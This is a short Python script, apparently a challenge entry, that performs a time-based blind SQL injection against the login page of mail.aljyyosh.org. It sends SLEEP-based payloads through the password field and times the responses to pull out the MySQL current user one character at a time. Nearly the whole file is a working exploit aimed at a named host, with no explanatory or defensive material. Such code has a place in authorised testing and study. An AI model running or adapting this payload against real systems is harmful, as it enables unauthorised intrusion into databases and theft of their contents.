import requests
print('''
               __         __  _
              /  \  |\/| |__ |  )
              \__/  |  | |__ | \    

                fb.com/omersimko
Cyber Shield Challenge of brute forcing aljyyosh.org mysql user
''')

timeout = 3
timeout1 = timeout + 1
a = 127
b = 1
sql = "'" + "AND (SELECT 3922 FROM (SELECT(SLEEP("+str(timeout)+")))jtEN)-- qMvu"
payload = {"nick" : "random","password" : sql,"login" : "Login"}
head = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
r = requests.post("http://mail.aljyyosh.org/login.php",data=payload,headers=head)
print("response took "+str(r.elapsed.total_seconds()))
if r.elapsed.total_seconds() >= timeout and r.elapsed.total_seconds() < timeout1:
    print("retrieving mysql user\n")
    while b <= 30:
        while a >= 32:
            sql1 = "' AND (SELECT 3230 FROM (SELECT(SLEEP("+str(timeout)+"-(IF(ORD(MID((CURRENT_USER()),"+str(b)+",1))>"+str(a)+",0,"+str(timeout)+")))))kvxb)-- LlAo"
            payload1 = {"nick": "random", "password": sql1, "login": "Login"}
            r = requests.post("http://mail.aljyyosh.org/login.php", data=payload1,headers=head)
            if r.elapsed.total_seconds() >= timeout and r.elapsed.total_seconds() < timeout1:
                for i in range(a,(128)):

                    sql1 = "' AND (SELECT 3230 FROM (SELECT(SLEEP(" + str(timeout) + "-(IF(ORD(MID((CURRENT_USER())," + str(b) + ",1))>" + str(i) + ",0," + str(timeout) + ")))))kvxb)-- LlAo"
                    payload1 = {"nick": "random", "password": sql1, "login": "Login"}
                    r = requests.post("http://mail.aljyyosh.org/login.php", data=payload1,headers=head)
                    if r.elapsed.total_seconds() < timeout:
                        print(chr(i),end="")
                        a = 127
                        break


                break


            a = a - 4
        b = b + 1






